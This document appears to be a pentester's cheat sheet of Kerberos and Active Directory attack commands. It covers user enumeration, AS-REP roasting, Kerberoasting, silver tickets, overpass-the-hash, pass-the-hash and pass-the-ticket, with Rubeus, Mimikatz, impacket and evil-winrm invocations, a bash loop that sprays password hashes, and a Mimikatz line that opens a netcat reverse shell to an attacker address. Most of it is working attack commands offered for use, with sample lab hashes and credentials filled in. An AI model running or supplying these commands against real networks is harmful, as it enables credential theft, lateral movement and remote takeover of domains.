Kerberos
========================

User enumeration

```
kerbrute userenum -d domain --dc <hostname> users.txt
```

AS-REP Roasting
```
impacket-GetNPUsers -request domain/ -usersfile usernames.txt -dc-ip <hostname>
```

## Kerberoasting
```
impacket-GetUserSPNs -request domain/user:password -dc-ip <hostname>
```
## Silver Ticket

```
rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt
```

## Overpass the hash

    impacket-getTGT -hashes :f6b7160bfc91823792e0ac3a162c9267 HTB.LOCAL/Administrator -dc-ip 10.10.10.103
    
    cp user.ccache /tmp/krb5cc_0
    export KRB5CCNAME=/tmp/krb5cc_0
    
    klist

## Pass the hash

### Impacket and evil-winrm
```
evil-winrm -i <hostname> -u user -H lmhash:nthash
impacket-psexec user@<hostname> -hashes lmhash:nthash
impacket-smbexec user@<hostname> -hashes lmhash:nthash
impacket-wmiexec user@<hostname> -hashes lmhash:nthash
```
**Bulk pass the hash**

Aqui temos uma opção intressante de verificar se existe a possibilidade de logar via kerberos com vários hashes de senha, sendo esese script válido para isto:


```
#!/bin/bash
#
for i in $(cat usernames.txt) 
do 
        for j in $(cat nthashes.txt) 
        do 
                echo trying $i:$j 
                echo 
                impacket-getTGT htb.local/$i -hashes $j:$j    
                echo 
                sleep 5 
        done 
done
```

### Rubeus and Mimikatz
```
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:Powershell.exe

sekurlsa::pth /domain:flight.htb /user:R.Cold /ntlm:5607f6eafc91b3506c622f70e7a77ce0 /run:".\n.exe -e cmd 10.10.14.14 8091"
```

## Pass the ticket

```
rub.exe ptt /ticket:0-40e10000-G0$@krbtgt~FLIGHT.HTB-FLIGHT.HTB.kirbi
```

![qownnotes-media-zBGsNi](../.gitbook/assets/qownnotes-media-zBGsNi.png)